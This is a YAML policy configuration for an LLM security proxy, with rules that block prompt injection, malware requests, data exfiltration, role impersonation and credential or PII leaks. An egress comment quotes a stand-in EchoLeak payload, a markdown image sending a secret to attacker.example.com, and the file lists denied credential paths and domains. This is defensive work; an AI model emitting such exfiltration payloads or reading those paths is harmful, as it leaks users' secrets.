version: "1.0"
policy_name: "default"

default_action: ALLOW

# Reef configuration. Reef extensions activate when --enable-reef is on.
# All paths and endpoints accept env-var override via the documented vars in
# .env.example (REEF_SVID_ISSUER_KEYS_DIR, REEF_AUDIT_DIR, REEF_OTEL_EXPORTER,
# etc).
reef:
  # A-5 MCP signature registry (Atlas) sidecar.
  mcp_verifier_url: "http://localhost:8080"
  mcp_verifier_timeout_ms: 1500

  # A-6 SVID JWT identity verification.
  require_svid: true
  svid_issuer_keys_dir: "./keys/svid-issuers"
  svid_audience: "lobstertrap-reef"

  # A-6 per-identity token-bucket rate limit.
  rate_limit:
    rate_per_second: 10
    burst: 20

  # A-6 EWMA OWASP ASI category tracker. Threshold is documentation-only;
  # the actual gating rule is `review_high_asi_ewma` below.
  ewma:
    alpha: 0.3
    categories: ["ASI01", "ASI06"]
    threshold: 0.4

  # A-6 Merkle audit log. Persisted to disk, signed root exported every
  # sign_root_interval_seconds.
  audit:
    dir: "./audit"
    sign_root_interval_seconds: 60
    signer_key_path: ""

  # A-6 OpenTelemetry exporter. exporter ∈ {otlp-http, stdout, none}.
  otel:
    exporter: "stdout"
    endpoint: "localhost:4318"

  # A-6 Sigstore-cosign-style policy bundle signer trust root. Path to the
  # ed25519 public key the hot-reload watcher verifies new bundles against.
  policy_signer_pub_key: "./keys/policy-signer.pub"

  # A-7 gRPC policy bus client. Opens a long-lived Subscribe stream against
  # the bus and hot-reloads on each verified bundle. The Go client lives in
  # pkg/policysync/grpc_client.go; cmd/serve.go wires it when --enable-reef
  # is on and the policy_signer_pub_key above resolves.
  policy_bus:
    grpc_url: "localhost:50051"
    # Pre-shared secret the operator publishes bundles with. Empty here —
    # set via REEF_POLICY_BUS_ADMIN_TOKEN env so it's never committed to
    # YAML.
    admin_token: ""
    # Reconnect backoff bounds on stream drop. Exponential between these.
    retry_backoff_seconds:
      initial: 0.5
      max: 30

  # A-9 Gemini surfaces. Model identifiers are env-driven (D-017 — Reef
  # NEVER hardcodes model names). Pro drives the red-team + underwriter;
  # Flash drives the blue-team observer. Resolution order at runtime:
  # env var → policy default below.
  gemini:
    pro_model: "${GEMINI_PRO_MODEL:-gemini-2.5-pro}"
    flash_model: "${GEMINI_FLASH_MODEL:-gemini-2.5-flash}"

  # A-9/A-10 Reef Quote (Underwriter Layer). Munich-Re-grounded scorer.
  # rubric_path can override the in-package copy of the framework markdown.
  underwriter:
    coverage_amount_usd: "${REEF_UNDERWRITER_COVERAGE_AMOUNT_USD:-5000000}"
    rubric_path: "${REEF_UNDERWRITER_RUBRIC:-./quote/app/rubrics/munich_re_framework.md}"

ingress_rules:
  - name: block_prompt_injection
    description: "Detected prompt injection attempt"
    priority: 100
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: prompt injection detected."
    conditions:
      - field: contains_injection_patterns
        match_type: boolean
        value: true

  - name: block_sensitive_paths
    description: "Prompt targets sensitive system paths"
    priority: 85
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: sensitive path access denied."
    conditions:
      - field: contains_sensitive_paths
        match_type: boolean
        value: true

  - name: block_harm_violence
    description: "Prompt requests instructions for violence, weapons, or harmful substances"
    priority: 98
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: request for harmful/violent content detected."
    conditions:
      - field: contains_harm_patterns
        match_type: boolean
        value: true

  - name: block_malware_request
    description: "Prompt requests creation of malware, exploits, or offensive tools"
    priority: 96
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: malware/exploit generation request detected."
    conditions:
      - field: contains_malware_request
        match_type: boolean
        value: true

  - name: block_phishing_fraud
    description: "Prompt requests creation of phishing content or fraudulent materials"
    priority: 94
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: phishing/fraud content request detected."
    conditions:
      - field: contains_phishing_patterns
        match_type: boolean
        value: true

  - name: block_data_exfiltration
    description: "Prompt contains data exfiltration patterns"
    priority: 92
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: data exfiltration attempt detected."
    conditions:
      - field: contains_exfiltration
        match_type: boolean
        value: true

  - name: block_obfuscation_evasion
    description: "Prompt uses encoding or obfuscation to evade detection"
    priority: 90
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: obfuscation/evasion technique detected."
    conditions:
      - field: contains_obfuscation
        match_type: boolean
        value: true

  - name: review_role_impersonation
    description: "Prompt attempts to assign a privileged role identity to the model"
    priority: 86
    action: HUMAN_REVIEW
    conditions:
      - field: contains_role_impersonation
        match_type: boolean
        value: true

  - name: block_pii_request
    description: "Prompt is requesting personal/sensitive information"
    priority: 82
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: request for personal/sensitive information detected."
    conditions:
      - field: contains_pii_request
        match_type: boolean
        value: true

  - name: block_dangerous_commands
    description: "Dangerous system commands detected"
    priority: 80
    action: DENY
    deny_message: "[LOBSTER TRAP] Blocked: dangerous command detected."
    conditions:
      - field: contains_system_commands
        match_type: boolean
        value: true
      - field: risk_score
        match_type: threshold
        value: 0.3

  - name: review_high_risk
    description: "High risk score requires human review"
    priority: 70
    action: HUMAN_REVIEW
    conditions:
      - field: risk_score
        match_type: threshold
        value: 0.6

  - name: log_code_execution
    description: "Log code execution requests"
    priority: 30
    action: LOG
    conditions:
      - field: intent_category
        match_type: exact
        value: "code_execution"

  # ---- Reef extension rules (A-4) ----
  # Each demonstrates one of the four actions Reef implements. They sit at
  # priorities BELOW the upstream block rules so an obvious credential leak
  # or harm request still wins. Enable with --enable-reef.

  # REDIRECT: route high-risk requests to a smaller local model (a Gemma
  # stub on localhost) instead of denying outright. Lets the demo continue
  # without leaking data and keeps the conversation alive for the user.
  - name: redirect_high_risk_to_local_model
    description: "Reef REDIRECT — route high-risk prompts to a local Gemma fallback"
    priority: 65
    action: REDIRECT
    redirect_target_band: high
    conditions:
      - field: risk_score
        match_type: threshold
        value: 0.7

  # QUARANTINE: hold conversations whose ingress prompt leaks credentials.
  # Operator review queue (Phase 2) decides whether to release or deny.
  - name: quarantine_credential_leak
    description: "Reef QUARANTINE — hold prompts that contain credentials for human review"
    priority: 60
    action: QUARANTINE
    deny_message: "[REEF] Prompt held for human review — credential exposure detected."
    conditions:
      - field: contains_credentials
        match_type: boolean
        value: true

  # HUMAN_REVIEW: pause + webhook when DAST-A's EWMA score over OWASP ASI
  # categories crosses a threshold. The score is populated by A-6 (SVID +
  # session/ewma package); until A-6 lands the field defaults to 0.0 so
  # this rule is effectively dormant in production but visible to operators
  # who want to dry-run the wiring.
  - name: human_review_novel_attack_pattern
    description: "Reef HUMAN_REVIEW — pause when multi-turn ASI EWMA exceeds threshold"
    priority: 55
    action: HUMAN_REVIEW
    conditions:
      - field: asi_category_ewma
        match_type: threshold
        value: 0.6

  # ---- Reef A-6 identity + rate-limit + EWMA rules ----
  # These rules fire on the metadata fields A-6 populates. The SVID and
  # rate-limit short-circuits happen BEFORE the rule table — these declarative
  # rules exist so an audit consumer that grep's the policy still sees the
  # match. Note: `deny_invalid_svid` is intentionally NOT declared here as a
  # rule because the pipeline short-circuits the SVID denial before any rule
  # evaluation; declaring it as a rule would over-block on require_svid=false
  # deployments. The pipeline uses synthetic rule names svid_invalid /
  # svid_expired / svid_missing / rate_limited_per_identity so audits remain
  # legible.

  - name: review_intent_mismatch
    description: Reef SVID — declared scope diverges from DPI-detected behaviour
    priority: 75
    action: HUMAN_REVIEW
    conditions:
      - field: intent_mismatch_score
        match_type: threshold
        value: 0.5

  - name: review_high_asi_ewma
    description: Reef EWMA — multi-turn OWASP ASI category accumulation exceeds threshold
    priority: 73
    action: HUMAN_REVIEW
    conditions:
      - field: asi_category_ewma
        match_type: threshold
        value: 0.4

  # ---- Reef A-5 MCP signature registry rules ----
  # The pre-ingress hook calls Atlas BEFORE these rules run; it pre-populates
  # mcp_bind_target_decision with the registry's allow/deny/review verdict.
  # These rules are kept here so operators can see the bind decision flow in
  # the policy YAML; the hook itself short-circuits with a synthetic
  # `mcp_bind_denied_by_registry` rule name, so audits surface that name
  # rather than these declarative matches.
  - name: mcp_bind_denied_by_registry
    description: "Reef MCP signature registry denied a server bind attempt"
    priority: 200
    action: DENY
    deny_message: "[REEF] BIND_DENIED — unsigned or poisoned MCP server (see audit log)."
    conditions:
      - field: mcp_bind_target_decision
        match_type: exact
        value: deny

  - name: mcp_bind_review_by_registry
    description: "Reef MCP signature registry flagged a server bind for review"
    priority: 198
    action: HUMAN_REVIEW
    conditions:
      - field: mcp_bind_target_decision
        match_type: exact
        value: review

egress_rules:
  # Reef MODIFY action (A-4): strips markdown images whose destination host
  # is not on network.allowed_domains. This is the EchoLeak block: the
  # `![](https://attacker.example.com/log?d=<secret>)` payload gets rewritten
  # into `[REDACTED: markdown image to attacker.example.com stripped by Reef
  # MODIFY]` before the response leaves the proxy. Requires --enable-reef;
  # vanilla Lobster Trap logs the match but leaves the body intact.
  - name: strip_markdown_image_exfil
    description: "EchoLeak — strip markdown-image exfil to untrusted domains"
    priority: 110
    action: MODIFY
    modify_strategy: strip_markdown_images_to_untrusted_domains
    conditions:
      - field: contains_markdown_image_with_external_url
        match_type: boolean
        value: true

  - name: block_credential_leak
    description: "Model output contains credentials"
    priority: 100
    action: DENY
    deny_message: "[LOBSTER TRAP] Output blocked: contains credentials."
    conditions:
      - field: contains_credentials
        match_type: boolean
        value: true

  - name: block_pii_leak
    description: "Model output contains PII"
    priority: 90
    action: DENY
    deny_message: "[LOBSTER TRAP] Output blocked: contains PII."
    conditions:
      - field: contains_pii
        match_type: boolean
        value: true

rate_limits:
  requests_per_minute: 120
  requests_per_hour: 2000
  burst_threshold: 30

network:
  egress_policy: allowlist
  allowed_domains:
    - "api.openai.com"
    - "api.anthropic.com"
  denied_domains:
    - "*.onion"
    - "pastebin.com"
  # Reef REDIRECT targets (A-4). Keyed by `redirect_target_band` on the rule.
  # Defaults point at a localhost stub; the Stage UI (Phase 2) hosts the real
  # mock. Override via REEF_REDIRECT_TARGET env var (used as a fallback when
  # no band matches).
  redirect_targets:
    low: "http://localhost:8765/gemma-stub-low"
    medium: "http://localhost:8765/gemma-stub-medium"
    high: "http://localhost:8765/gemma-stub-high"

# Reef notifications (A-4). Used by the HUMAN_REVIEW action to POST request
# context to an approval queue. Override via REEF_HUMAN_REVIEW_WEBHOOK env
# var. Defaults to the Stage UI's stub endpoint.
notifications:
  human_review_webhook: "http://localhost:8766/approval-queue"
  human_review_timeout_ms: 1500
  human_review_retry_after_seconds: 30

filesystem:
  denied_paths:
    - "/etc/**"
    - "/root/**"
    - "**/.ssh/**"
    - "**/.env"
    - "**/*secret*"
    - "**/*password*"
  allowed_read_paths:
    - "/home/*/documents/**"
    - "/tmp/agent_workspace/**"
  allowed_write_paths:
    - "/home/*/documents/agent_output/**"
    - "/tmp/agent_workspace/**"
